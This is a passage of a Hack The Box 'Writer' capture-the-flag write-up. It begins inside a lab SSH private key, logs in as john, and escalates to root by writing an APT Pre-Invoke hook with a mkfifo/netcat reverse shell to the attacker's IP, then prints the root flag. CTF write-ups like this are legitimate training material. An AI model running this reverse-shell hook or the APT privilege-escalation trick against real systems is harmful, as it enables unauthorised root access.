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
-----END OPENSSH PRIVATE KEY-----
```

```console
┌─[evyatar@parrot]─[/hackthebox/Writer]
└──╼ $ ssh -i id_rsa_john john@writer.htb
Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-80-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sun 15 Aug 21:03:55 UTC 2021

  System load:           0.01
  Usage of /:            64.0% of 6.82GB
  Memory usage:          24%
  Swap usage:            0%
  Processes:             260
  Users logged in:       1
  IPv4 address for eth0: 10.10.11.101
  IPv6 address for eth0: dead:beef::250:56ff:feb9:6f9c

 * Pure upstream Kubernetes 1.21, smallest, simplest cluster ops!

     https://microk8s.io/

0 updates can be applied immediately.


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Wed Jul 28 09:19:58 2021 from 10.10.14.19
john@writer:~$ 
```

### Root

By running ```groups```/```id``` we can see we are on the following group:
```console
john@writer:/etc/apt/apt.conf.d$ id
uid=1001(john) gid=1001(john) groups=1001(john),1003(management)
john@writer:/etc/apt/apt.conf.d$ groups
john management
```

Let's find again files owned by our group ```management```:
```console
john@writer:/home$ find / -group management -ls 2>&1 | grep -v "denied"
    17525      4 drwxrwxr-x   2 root     management     4096 Aug 15 21:20 /etc/apt/apt.conf.d
```

So we can see we have write permission to ```/etc/apt/apt.conf.d``` directory read about that directory on [https://kali.training/topic/advanced-apt-configuration-and-usage/](https://kali.training/topic/advanced-apt-configuration-and-usage/).

We need first to create the following file on ```apt.conf.d``` directory:
```console
john@writer:/etc/apt/apt.conf.d$ echo 'apt::Update::Pre-Invoke {"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.14 1234 >/tmp/f"};' > pwn

```

Listen to port 1234 using ```nc``` and we get the reverse shell:
```console
┌─[evyatar@parrot]─[/hackthebox/Writer]
└──╼ $ nc -lvp 1234
listening on [any] 1234 ...
connect to [10.10.14.14] from writer.htb [10.10.11.101] 34076
/bin/sh: 0: can't access tty; job control turned off
# whoami
root
# cat /root/root.txt
62ff13e4cbca08766dcbedca5a1a726e
```

And we get the root flag ```62ff13e4cbca08766dcbedca5a1a726e```.
